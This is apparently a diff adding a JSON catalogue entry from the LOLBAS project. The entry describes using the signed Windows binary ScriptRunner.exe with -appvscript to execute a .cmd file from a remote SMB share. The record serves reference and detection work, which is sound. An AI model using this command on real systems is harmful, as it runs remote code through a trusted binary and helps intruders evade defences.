@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-scriptrunner-exe-execute-2",
+  "name": "LOLBAS · Scriptrunner.exe (Execute) #2",
+  "command": "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}",
+  "description": "Executes cmd file from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "scriptrunner",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Scriptrunner/",
+  "upstream_id": "Scriptrunner.exe/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Scriptrunner.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Scriptrunner/"
+    }
+  ]
+}
